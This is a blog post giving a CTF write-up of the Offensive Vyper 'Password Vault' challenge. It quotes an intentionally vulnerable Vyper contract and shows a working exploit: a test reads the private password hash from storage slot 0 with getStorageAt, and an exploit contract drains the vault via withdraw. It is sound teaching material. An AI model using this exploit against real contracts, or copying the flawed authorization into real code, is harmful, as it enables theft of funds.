<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Offensive Vyper - Challenge 0 - Password Vault - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Offensive Vyper - Challenge 0 - Password Vault" />
<meta property="og:description" content="Solution for &ldquo;Offensive Vyper - Challenge 0 - Password Vault&rdquo;." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://dellalibera.github.io/posts/offensivevyper_00_passwordvault/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-09-22T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-09-22T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://dellalibera.github.io"/>

<meta name="twitter:title" content="Offensive Vyper - Challenge 0 - Password Vault"/>
<meta name="twitter:description" content="Solution for &ldquo;Offensive Vyper - Challenge 0 - Password Vault&rdquo;."/>
<meta name="application-name" content="della&#39;s blog">
<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/offensivevyper_00_passwordvault/" /><link rel="prev" href="https://dellalibera.github.io/posts/damnvulnerabledefi_08_puppet/" /><link rel="next" href="https://dellalibera.github.io/posts/offensivevyper_01_unstoppableauction/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Offensive Vyper - Challenge 0 - Password Vault",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_00_passwordvault\/"
        },"genre": "posts","keywords": "Offensive Vyper, CTF, Vyper, Blockchain","wordcount":  692 ,
        "url": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_00_passwordvault\/","datePublished": "2022-09-22T00:00:00+00:00","dateModified": "2022-09-22T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "della"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title">Offensive Vyper - Challenge 0 - Password Vault</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="September 22, 2022">September 22, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;692 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#0-intro">0) Intro</a></li>
    <li><a href="#1-challenge">1) Challenge</a></li>
    <li><a href="#2-code-review">2) Code Review</a></li>
    <li><a href="#3-solution">3) Solution</a></li>
    <li><a href="#4-references">4) References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Offensive Vyper - Challenge 0 - Password Vault&rdquo;.</div>
<h2 id="0-intro">0) Intro</h2>
<p>This article is the first write-up of the Offensive Vyper challenges created by <a href="https://twitter.com/jtriley_eth" target="_blank" rel="noopener noreffer ">@jtriley_eth</a>.</p>
<p>You can find instructions on how to get started <a href="https://github.com/JoshuaTrujillo15/offensive_vyper" target="_blank" rel="noopener noreffer ">here</a>.</p>
<h2 id="1-challenge">1) Challenge</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">The Password Vault is a vault that holds Ether and is password protected. Your Objective is to steal all of the Ether in the Vault. While the password is stored in this repository, the objective is to do it without reading the password from <code>test/secrets/dont-peek.js</code>.</div>
        </div>
    </div>
<h2 id="2-code-review">2) Code Review</h2>
<p><code>PasswordVault.vy</code> contract (<a href="https://github.com/JoshuaTrujillo15/offensive_vyper/blob/2c02cb408e95030215ff5d2aef087213f64edd17/contracts/password-vault/PasswordVault.vy" target="_blank" rel="noopener noreffer ">source code</a>):</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># @version ^0.3.2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@title Password Protected Vault
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@author jtriley.eth
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">password_hash</span>: <span style="color:#000">bytes32</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">owner</span>: <span style="color:#000">address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">__init__</span>(<span style="color:#000">password_hash</span>: <span style="color:#000">bytes32</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">password_hash</span> = <span style="color:#000">password_hash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">owner</span> = <span style="color:#000">msg</span>.<span style="color:#000">sender</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">set_new_password</span>(<span style="color:#000">old_password_hash</span>: <span style="color:#000">bytes32</span>, <span style="color:#000">new_password_hash</span>: <span style="color:#000">bytes32</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice Sets a new password hash. Passwords are hashed offchain for security.
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param old_password_hash Last password hash for authentication.
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param new_password_hash New password hash to set.
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @dev Throws when password is invalid and the caller is not the owner.
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">assert</span> <span style="color:#000">self</span>.<span style="color:#000">password_hash</span> == <span style="color:#000">old_password_hash</span> <span style="color:#00f">or</span> <span style="color:#000">msg</span>.<span style="color:#000">sender</span> == <span style="color:#000">self</span>.<span style="color:#000">owner</span>, <span style="color:#5a2">&#34;unauthorized&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">password_hash</span> = <span style="color:#000">new_password_hash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">withdraw</span>(<span style="color:#000">password_hash</span>: <span style="color:#000">bytes32</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice Withdraws funds from vault.
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param password_hash Password hash for authentication.
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @dev Throws when password hash is invalid and the caller is not the owner.
</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">assert</span> <span style="color:#000">self</span>.<span style="color:#000">password_hash</span> == <span style="color:#000">password_hash</span> <span style="color:#00f">or</span> <span style="color:#000">msg</span>.<span style="color:#000">sender</span> == <span style="color:#000">self</span>.<span style="color:#000">owner</span>, <span style="color:#5a2">&#34;unauthorized&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">send</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">self</span>.<span style="color:#000">balance</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
</span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">__default__</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#00f">pass</span></span></span></code></pre></td></tr></table>
</div>
</div>
<p>Contract main functions:</p>
<ul>
<li>
<p><code>set_new_password</code> is used to set a new password. It accepts the old password and the new password to set. It checks if the <code>old_password_hash</code> parameter equals the initial password (set during contract creation) and if the <code>msg.sender</code> equals the owner. If one of these two conditions is false, the function fails. So, the owner can change the password even without knowing the old one, and anyone who knows the current password can change it with a new one.</p>
</li>
<li>
<p><code>withdraw</code> allows to withdraw the contract balance and sends it to the <code>msg.sender</code>. To withdraw the entire amount is required to provide the password hash. There are two checks in place: one checks if the password provided is equal to the <code>password_hash</code>, and the other if the <code>msg.sender</code> is the contract owner.</p>
</li>
</ul>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>The <code>@dev</code> comment of both functions says:</p>
<blockquote>
<p>Throws when password is invalid <strong>and</strong> the caller is not the owner.</p>
</blockquote>
<p>These conditions are evaluated in a logical disjunction (<strong>OR</strong>), so only one of the two needs to be true to execute the functions.</p>
</div>
        </div>
    </div>
<p>Therefore, since we are interested in stealing all the ETH, if we find a way to discover the value of the  <code>password_hash</code>, we can withdraw the entire amount and solve the challenge (the condition <code>self.password_hash == password_hash</code> will be true).</p>
<div class="details admonition question open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Where is <code>password_hash</code> value stored?</div>
        </div>
    </div>
<p><code>password_hash</code> is a contract variable and is initialized during the contract creation (line <code>14</code>). This variable is not public, so it&rsquo;s not accessible from the external. However, reading the <a href="https://vyper.readthedocs.io/en/stable/scoping-and-declarations.html#storage-layout" target="_blank" rel="noopener noreffer ">documentation</a>:</p>
<blockquote>
<p>Storage variables are located within a smart contract at specific storage slots. By default, the compiler allocates the first variable to be stored at slot 0; subsequent variables are stored in order after that.</p>
</blockquote>
<p>The <code>password_hash</code> is the first contract variable (line <code>8</code>), so it&rsquo;s stored in the slot <code>0</code>.</p>
<div class="details admonition question open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">How can we read contract storage variables?</div>
        </div>
    </div>
<p>Using the <code>getStorageAt</code> from the <code>ethers</code> library we can access the contract storage.</p>
<h2 id="3-solution">3) Solution</h2>
<p>The solution consists of two steps:</p>
<ul>
<li>retrieve the password hash from the contract storage</li>
<li>call the withdraw function providing this password</li>
</ul>
<p><code>password-vault.challenge.js</code>:
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// YOUR EXPLOIT HERE
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">password</span> = <span style="color:#00f">await</span> <span style="color:#000">attacker</span>.<span style="color:#000">provider</span>.<span style="color:#000">getStorageAt</span>(<span style="color:#00f">this</span>.<span style="color:#000">vault</span>.<span style="color:#000">address</span>, <span style="color:#3af">0</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">exploit</span> = <span style="color:#00f">await</span> (<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;PasswordVaultExploit&#39;</span>, <span style="color:#000">deployer</span>)).<span style="color:#000">deploy</span>(<span style="color:#00f">this</span>.<span style="color:#000">vault</span>.<span style="color:#000">address</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">exploit</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>(<span style="color:#000">password</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    })</span></span></code></pre></td></tr></table>
</div>
</div></p>
<p><code>PasswordVaultExploit.vy</code>:
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># YOUR EXPLOIT HERE</span>
</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">run</span>(<span style="color:#000">password_hash</span>: <span style="color:#000">bytes32</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#000">Passwordvault</span>(<span style="color:#000">self</span>.<span style="color:#000">target</span>).<span style="color:#000">withdraw</span>(<span style="color:#000">password_hash</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
</span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">__default__</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#00f">pass</span></span></span></code></pre></td></tr></table>
</div>
</div></p>
<p>You can find the complete code <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/password-vault.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/PasswordVaultExploit.vy" target="_blank" rel="noopener noreffer ">here</a>.</p>
<h2 id="4-references">4) References</h2>
<ul>
<li><a href="https://vyper.readthedocs.io/en/stable/scoping-and-declarations.html#storage-layout" target="_blank" rel="noopener noreffer ">storage-layout</a></li>
<li><a href="https://docs.ethers.io/v5/api/providers/provider/#Provider-getStorageAt" target="_blank" rel="noopener noreffer ">ethers - Provider.getStorageAt</a></li>
</ul></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on September 22, 2022</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/offensivevyper_00_passwordvault/" data-title="Offensive Vyper - Challenge 0 - Password Vault" data-via="_d3lla_" data-hashtags="Offensive Vyper,CTF,Vyper,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/offensivevyper_00_passwordvault/" data-hashtag="Offensive Vyper"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/offensivevyper_00_passwordvault/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/offensive-vyper/">Offensive Vyper</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/vyper/">Vyper</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/damnvulnerabledefi_08_puppet/" class="prev" rel="prev" title="Damn Vulnerable DeFi - Challenge #8 - Puppet"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Damn Vulnerable DeFi - Challenge #8 - Puppet</a>
            <a href="/posts/offensivevyper_01_unstoppableauction/" class="next" rel="next" title="Offensive Vyper - Challenge 1 - Unstoppable Auction">Offensive Vyper - Challenge 1 - Unstoppable Auction<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
